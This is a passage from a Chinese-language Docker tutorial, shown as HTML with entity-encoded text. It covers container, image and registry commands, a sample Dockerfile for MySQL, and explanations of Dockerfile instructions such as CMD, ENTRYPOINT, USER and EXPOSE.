class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp # &#x4ECE;&#x5BB9;&#x5668;&#x91CC;&#x5411;&#x5916;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;</span><br><span class="line">docker export # &#x5C06;&#x5BB9;&#x5668;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5BFC;&#x51FA;&#x4E00;&#x4E2A;tar&#x5305;&#xFF0C;&#x4E0D;&#x5E26;layers&#x3001;tag&#x7B49;&#x4FE1;&#x606F;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6267;&#x884C;&#xFF1A;</p><pre><code>docker exec  # &#x5728;&#x5BB9;&#x5668;&#x91CC;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;bash&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x5F0F;</code></pre><p>&#x955C;&#x50CF;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker images    # &#x663E;&#x793A;&#x672C;&#x5730;&#x6240;&#x6709;&#x7684;&#x955C;&#x50CF;&#x5217;&#x8868;</span><br><span class="line">docker import    # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x5F80;&#x5F80;&#x548C;export&#x7ED3;&#x5408;&#x4F7F;&#x7528;</span><br><span class="line">docker build     # &#x4F7F;&#x7528;Dockerfile&#x521B;&#x5EFA;&#x955C;&#x50CF;&#xFF08;&#x63A8;&#x8350;&#xFF09;</span><br><span class="line">docker commit    # &#x4ECE;&#x5BB9;&#x5668;&#x521B;&#x5EFA;&#x955C;&#x50CF;</span><br><span class="line">docker rmi       # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x955C;&#x50CF;</span><br><span class="line">docker load      # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x548C;save&#x914D;&#x5408;&#x4F7F;&#x7528;</span><br><span class="line">docker history   # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4FDD;&#x5B58;&#x4E3A;&#x4E00;&#x4E2A;tar&#xFF0C;&#x5E26;layers&#x548C;tag&#x4FE1;&#x606F;</span><br><span class="line">docker history   # &#x663E;&#x793A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x7684;&#x5386;&#x53F2;&#x547D;&#x4EE4;</span><br><span class="line">docker tag       # &#x4E3A;&#x955C;&#x50CF;&#x8D77;&#x4E00;&#x4E2A;&#x522B;&#x540D;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#xFF08;registry&#xFF09;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker login    # &#x767B;&#x5F55;&#x5230;&#x4E00;&#x4E2A;registry</span><br><span class="line">docker search   # &#x4ECE;registry&#x4ED3;&#x5E93;&#x641C;&#x7D22;&#x955C;&#x50CF;</span><br><span class="line">docker pull     # &#x4ECE;&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D;&#x955C;&#x50CF;&#x5230;&#x672C;&#x5730;</span><br><span class="line">docker push     # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;push&#x5230;registry&#x4ED3;&#x5E93;&#x4E2D;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>2.5 &#x7B80;&#x5355;&#x5B9E;&#x8DF5;&#x64CD;&#x4F5C;</strong></p><p>&#x8FD0;&#x884C;&#x5E76;&#x8FDB;&#x5165;&#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t docker.io/1832990/centos6.5 /bin/bash</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>-t&#x8868;&#x793A;&#x5728;&#x65B0;&#x5BB9;&#x5668;&#x5185;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x4F2A;&#x7EC8;&#x7AEF;&#x6216;&#x7EC8;&#x7AEF;</li><li>-i&#x8868;&#x793A;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5BF9;&#x5BB9;&#x5668;&#x5185;&#x7684;(STDIN)&#x8FDB;&#x884C;&#x4EA4;&#x4E92;</li><li>-d&#x8868;&#x793A;&#x5C06;&#x5BB9;&#x5668;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF1B;</li><li>/bin/bash&#x5728;&#x5BB9;&#x5668;&#x5185;&#x542F;&#x52A8;bash shell</li></ul><p>&#x6240;&#x4EE5;&#x5F53;&#x5BB9;&#x5668;&#xFF08;container&#xFF09;&#x542F;&#x52A8;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x793A;&#x7B26;&#xFF1A;</p><p>&#x5728;&#x5BB9;&#x5668;&#x5185;&#x6211;&#x4EEC;&#x5B89;&#x88C5;mysql&#x5E76;&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF;&#x63D0;&#x4EA4;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -l  #&#x67E5;&#x8BE2;&#x5BB9;&#x5668;ID</span><br><span class="line">docker commit -m &quot;&#x529F;&#x80FD;&quot; -a &quot;&#x7528;&#x6237;&#x4FE1;&#x606F;&quot; ID tag  #&#x63D0;&#x4EA4;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect ID    # &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;</span><br><span class="line">docker push ID     # &#x4E0A;&#x4F20;docker&#x955C;&#x50CF;</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x5229;&#x7528;DockerFile&#x521B;&#x5EFA;&#x955C;&#x50CF;</strong><br>&#x4F7F;&#x7528;docker  build&#xFF0C;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;dockerfile&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x7EC4;&#x6307;&#x4EE4;&#x6765;&#x544A;&#x8BC9;docker&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x955C;&#x50CF;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir DockerFile</span><br><span class="line">cd DockerFile</span><br><span class="line">cat &gt; Dockerfile &lt;&lt;EOF</span><br><span class="line">FROM 603dd3515fcc</span><br><span class="line">MAINTAINER Dcoker xuel</span><br><span class="line">RUN yum install mysql mysql-server -y</span><br><span class="line">RUN mkdir /etc/sysconfig/network</span><br><span class="line">RUN /etc/init.d/mysqld start</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure><p></p><pre><code>docker build -t &quot;centos6.8:mysqld&quot; &#x3002;</code></pre><ul><li>-t&#x6307;&#x5B9A;repository&#x4E0E;tag</li><li>.&#x6307;&#x5B9A;Dockerfile&#x7684;&#x8DEF;&#x5F84;</li></ul><p>&#x6CE8;&#x610F;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4E0D;&#x80FD;&#x8D85;&#x8FC7;127&#x5C42;</p><p>&#x6B64;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;ADD&#x547D;&#x4EE4;&#x590D;&#x5236;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5230;&#x955C;&#x50CF;&#xFF1B;<br>&#x7528;EXPOSE&#x547D;&#x4EE4;&#x6765;&#x5411;&#x5916;&#x90E8;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#xFF1B;<br>&#x7528;CMD&#x547D;&#x4EE4;&#x6765;&#x63CF;&#x8FF0;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x540E;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;&#x3002;<br>CMD [&#x201C;/usr/sbin/apachectl&#x201D;, &#x201C;-D&#x201D;, &#x201C;FOREGROUND&#x201D;]</p><p><strong>2.6 Docker&#x6587;&#x4EF6;&#x8BE6;&#x89E3;</strong></p><p>Dockerfile&#x7684;&#x6307;&#x4EE4;&#x6839;&#x636E;&#x4F5C;&#x7528;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#x548C;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#x3002;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x6784;&#x5EFA;image&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x518D;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E0A;&#x6267;&#x884C;&#xFF1B;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;image&#x5C5E;&#x6027;&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x5C06;&#x5728;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x3002;</p><ul><li>FROM &#xFF08;&#x6307;&#x5B9A;&#x57FA;&#x7840;image&#xFF09;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x4E14;&#x9700;&#x8981;&#x5728;Dockerfile&#x5176;&#x4ED6;&#x6307;&#x4EE4;&#x7684;&#x524D;&#x9762;&#x3002;&#x540E;&#x7EED;&#x7684;&#x6307;&#x4EE4;&#x7248;&#x672C;&#x90FD;&#x4F9D;&#x8D56;&#x4E8E;&#x8BE5;&#x6307;&#x4EE4;&#x7684;image&#x3002;<br>FROM&#x6307;&#x4EE4;&#x6307;&#x5B9A;&#x7684;&#x57FA;&#x7840;image&#x53EF;&#x4EE5;&#x662F;&#x5B98;&#x65B9;&#x8FDC;&#x7A0B;&#x4ED3;&#x5E93;&#x4E2D;&#x7684;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F4D;&#x4E8E;&#x672C;&#x5730;&#x4ED3;&#x5E93;</li></ul><p>&#x8BE5;&#x6307;&#x4EE4;&#x6709;&#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> &lt;iamge&gt;        <span class="comment"># &#x6307;&#x5B9A;&#x57FA;&#x7840;image&#x4E3A;&#x8BE5;image&#x7684;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x7248;&#x672C;</span></span><br><span class="line"><span class="keyword">FROM</span> &lt;image&gt;:&lt;tag&gt;  <span class="comment"># &#x6307;&#x5B9A;&#x57FA;&#x7840;&#x4E3A;&#x8BE5;image&#x7684;&#x4E00;&#x4E2A;tag&#x7248;&#x672C;</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li><p>MAINTAINER&#xFF08;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x955C;&#x50CF;&#x521B;&#x5EFA;&#x8005;&#x4FE1;&#x606F;&#xFF09;<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x5C06;image&#x7684;&#x5236;&#x4F5C;&#x8005;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;image&#x4E2D;&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;&#x8BE5;image&#x6267;&#x884C;docker inspect&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x8F93;&#x51FA;&#x4E2D;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x8BB0;&#x5F55;&#x8BE5;&#x4FE1;&#x606F;&#x3002;</p><p>  MAINTAINER <name></name></p></li><li><p>RUN(&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x7528;)<br>&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;RUN&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x4EFB;&#x4F55;&#x88AB;&#x57FA;&#x7840;image&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x5982;&#x57FA;&#x7840;image&#x9009;&#x62E9;&#x4E86;ubuntu&#xFF0C;&#x90A3;&#x4E48;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x90E8;&#x5206;&#x53EA;&#x80FD;&#x4F7F;&#x7528;ubuntu&#x7684;&#x547D;&#x4EE4;&#x3002;</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> &lt;<span class="built_in">command</span>&gt; (the <span class="built_in">command</span> is run <span class="keyword">in</span> a shell - `/bin/sh -c`)</span></span><br><span class="line"><span class="bash">RUN [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span> ...] (<span class="built_in">exec</span> form)</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>CMD(&#x8BBE;&#x7F6E;container&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;)<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;container&#x542F;&#x52A8;&#x65F6;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x8BE5;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x81EA;&#x5B9A;&#x4E49;&#x811A;&#x672C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x8BE5;&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x5728;&#x6587;&#x4EF6;&#x4E2D;&#x7EA2;&#x5B58;&#x5728;&#x4E00;&#x6B21;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#xFF0C;&#x5219;&#x6267;&#x884C;&#x6700;&#x540E;&#x4E00;&#x6761;&#x3002;</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;executablel&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>] (like an <span class="built_in">exec</span>, this is the preferred form)</span></span><br><span class="line"><span class="bash">CMD <span class="built_in">command</span> param1 para2 (as a shell)</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>ENTRYPOINT&#x6307;&#x5B9A;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8BE5;&#x6307;&#x5B9A;&#x7684;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x5C06;&#x4F1A;&#x4EE5;param1&#x548C;param2&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x5982;&#x679C;CMD&#x6307;&#x4EE4;&#x4F7F;&#x7528;&#x4E0A;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;Dockerfile&#x4E2D;&#x5FC5;&#x987B;&#x8981;&#x6709;&#x914D;&#x5957;&#x7684;ENTRYPOINT&#x3002;&#x5F53;Dockerfile&#x5236;&#x5B9A;&#x4E86;ENTRYPOINT&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x683C;&#x5F0F;&#xFF1A;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>] (as defualt paramenters to ENTRYPOINT)</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>ENTRYPOINT&#xFF0C;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6709;&#x6548;&#x3002;</li></ul><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>](like an <span class="built_in">exec</span>, the preferred fomr)</span></span><br><span class="line"><span class="bash">ENTRYPOINT <span class="built_in">command</span> param1 param2 (as a shell)</span></span><br></pre></td></tr></tbody></table></figure><p>&#x8BE5;&#x6307;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x548C;CMD&#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;<br>&#x5F53;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x4F7F;&#x7528;&#x4E86;CMD&#x547D;&#x4EE4;&#x4E14;CMD&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;CMD&#x6307;&#x4EE4;&#x548C;ENTRYPOINT&#x4F1A;&#x76F8;&#x4E92;&#x8986;&#x76D6;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x6216;&#x8005;ENTRYPINT&#x6709;&#x6548;&#x3002;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CMD&#x6307;&#x4EE4;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x53EA;&#x6709;ENTRYPOINT&#x6307;&#x4EE4;&#x88AB;&#x6267;&#x884C;</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;Hello, World!&quot;</span></span></span><br><span class="line"><span class="bash">ENTRYPOINT ls -l</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53E6;&#x4E00;&#x79CD;&#x7528;&#x6CD5;&#x548C;CMD&#x6307;&#x4EE4;&#x914D;&#x5408;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;ENTRYPIINT&#x7684;&#x9ED8;&#x8BA4;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;CMD&#x6307;&#x4EE4;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x53C2;&#x6570;&#x90E8;&#x5206;&#xFF1B;ENTRYPOINT&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x4F7F;&#x7528;JSON&#x65B9;&#x5F0F;&#x6307;&#x5B9A;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x3002;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;-l&quot;</span>]</span></span><br><span class="line"><span class="bash">ENTRYPOINT [<span class="string">&quot;/usr/bin/ls&quot;</span>]</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li><p>USER&#xFF08;&#x8BBE;&#x7F6E;container&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF09;<br>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;root&#x7528;&#x6237;</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x6307;&#x5B9A;memcached&#x7684;&#x8FD0;&#x884C;&#x7528;&#x6237;</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;memcached&quot;</span>]</span></span><br><span class="line"><span class="bash">USER daemon</span></span><br><span class="line"><span class="bash">&#x6216;</span></span><br><span class="line"><span class="bash">ENTRYPOINT [<span class="string">&quot;memcached&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;daemon&quot;</span>]</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>EXPOSE&#xFF08;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#xFF09;</p></li></ul><p>&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BE5;&#x6307;&#x4EE4;&#x4F1A;&#x5C06;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x3002;&#x5F53;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;&#x7528;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x6620;&#x5C04;&#x540E;&#x7684;&#x7AEF;&#x53E3;&#x3002;&#x8981;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x9996;&#x5148;&#x5728;Dockerfile&#x4F7F;&#x7528;EXPOSE&#x8BBE;&#x7F6E;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;-p&#x9009;&#x9879;&#x52A0;&#x4E0A;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x6837;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4F1A;&#x88AB;&#x968F;&#x673A;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x90A3;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x65F6;&#x8981;&#x786E;&#x4FDD;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x6CA1;&#x6709;&#x88AB;&#x4F7F;&#x7528;&#x3002;EXPOSE&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x54CD;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x914D;&#x5957;&#x7684;&#x591A;&#x6B21;&#x4F7F;&#x7528;-p&#x9009;&#x9879;&#x3002;<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;</span></span><br><span class="line"><span class="keyword">EXPOSE</span> port1</span><br><span class="line"><span class="comment"># &#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#xFF08;&#x4E3B;&#x673A;&#xFF08;&#x7AEF;&#x53E3;&#xFF09;&#x7AEF;&#x53E3;&#xFF1A;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF09;</span></span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -p port image</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># &#x6620;&#x5C04;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;</span></span></span><br><span class="line"><span class="bash">EXPOSE port1 port2 port3</span></span><br><span class="line"><span class="bash"><span class="comment"># &#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;</span></span></span><br><span class="line"><span class="bash">docker run -p port1 -p port2 -p port3 image</span></span><br><span class="line"><span class="bash"><span class="comment">#&#x8FD8;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;</span></span></span><br><span class="line"><span class="bash">docker run -p host_port1:port1 -p host_port2:port2 -p host_port3:port3 